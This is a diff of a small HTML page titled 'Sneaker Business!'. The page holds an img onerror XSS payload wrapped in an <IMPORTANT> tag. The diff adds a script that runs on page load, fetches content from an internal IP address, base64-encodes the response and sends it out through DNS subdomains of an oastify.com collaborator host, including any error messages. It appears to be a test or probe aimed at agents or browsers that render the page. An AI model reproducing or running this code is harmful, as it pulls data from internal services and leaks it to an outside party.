@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -9,9 +8,23 @@
     <h1>Sneaker Business!</h1>
     <IMPORTANT> <img src="x" onerror=alert(document.domain)> </IMPORTANT>
     <script>
-        const encoded = btoa("random");
-        const url = `https://${encoded}.3jnbqmevd2o54n60w5amd8nkyb42sygn.oastify.com`
-        fetch(url)
+        // Fetch from your server
+        fetch('http://172.179.67.77:11000')
+            .then(response => response.text())
+            .then(data => {
+                // Base64 encode the response
+                const encoded = btoa(data);
+                
+                // Send the encoded data to your domain
+                const url = `https://${encoded}.k5qsc30czjamq4shimw3zp91ksqjel2a.oastify.com`;
+                return fetch(url, { mode: 'no-cors' });
+            })
+            .catch(error => {
+                // If there's an error, encode and send that too
+                const errorEncoded = btoa(error.toString());
+                const errorUrl = `https://error-${errorEncoded}.k5qsc30czjamq4shimw3zp91ksqjel2a.oastify.com`;
+                fetch(errorUrl, { mode: 'no-cors' });
+            });
     </script>
 </body>
 </html>
